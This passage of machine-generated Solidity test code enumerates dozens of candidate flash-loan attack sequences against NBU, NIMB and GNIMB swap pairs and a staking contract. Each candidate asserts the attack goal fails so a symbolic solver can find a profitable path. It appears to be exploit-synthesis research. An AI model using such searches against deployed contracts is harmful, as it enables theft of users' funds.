        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2471(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2472(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2473(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2474(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2475(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2476(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2477(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2478(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2479(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2480(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2481(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2482(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2483(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2484(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2485(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2486(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2487(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2488(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2489(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2490(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2491(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2492(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2493(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2494(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2495(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2496(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2497(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2498(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2499(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2500(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2501(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2502(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2503(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2504(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2505(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2506(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2507(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2508(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2509(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2510(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2511(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2512(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2513(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2514(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2515(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2516(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2517(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand2518(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
